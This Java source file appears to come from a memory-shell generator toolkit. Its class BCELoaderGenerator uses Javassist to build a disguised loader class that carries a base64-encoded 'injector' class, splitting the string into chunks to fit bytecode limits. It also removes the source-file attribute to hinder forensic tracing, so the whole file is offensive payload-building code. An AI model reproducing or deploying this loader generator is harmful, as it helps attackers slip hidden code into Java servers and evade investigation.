package jmg.core.format;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import jmg.core.config.AbstractConfig;
import jmg.core.util.JavassistUtil;

public class BCELoaderGenerator {
    public static byte[] generatorBCELoaderClass(AbstractConfig config) {
        try {
            ClassPool pool = ClassPool.getDefault();
            ClassClassPath classPath = new ClassClassPath(BCELoader.class);
            pool.insertClassPath(classPath);
            CtClass ctClass = pool.getCtClass(BCELoader.class.getName());
            ctClass.setName(config.getLoaderClassName());
            ctClass.getClassFile().setVersionToJava5();
            CtMethod getClassName = ctClass.getDeclaredMethod("getClassName");
            getClassName.setBody(String.format("{return \"%s\";}", config.getInjectorClassName()));
            CtMethod getBase64String = ctClass.getDeclaredMethod("getBase64String");
            String base64ClassString = encodeToBase64(config.getInjectorBytes()).replace(System.lineSeparator(), "");
            String[] parts = splitChunks(base64ClassString, 40000);
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < parts.length; i++) {
                if (i > 0) result.append("+");
                result.append("new String(\"" + parts[i] + "\")");
            }
            getBase64String.setBody(String.format("{return %s;}", result));
            ctClass.defrost();
            JavassistUtil.removeSourceFileAttribute(ctClass);
            byte[] bytes = ctClass.toBytecode();
            ctClass.detach();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private static String encodeToBase64(byte[] input) throws Exception {
        String value = null;
        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, input);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, input);
            } catch (Exception var5) {
            }
        }
        return value;
    }

    private static String[] splitChunks(String source, int CHUNK_SIZE) {
        String[] ret = new String[(int) Math.ceil(source.length() / (double) CHUNK_SIZE)];
        char[] payload = source.toCharArray();
        int start = 0;
        for (int i = 0; i < ret.length; i++) {
            if (start + CHUNK_SIZE > payload.length) {
                char[] b = new char[payload.length - start];
                System.arraycopy(payload, start, b, 0, payload.length - start);
                ret[i] = new String(b);
            } else {
                char[] b = new char[CHUNK_SIZE];
                System.arraycopy(payload, start, b, 0, CHUNK_SIZE);
                ret[i] = new String(b);
            }
            start += CHUNK_SIZE;
        }
        return ret;
    }
}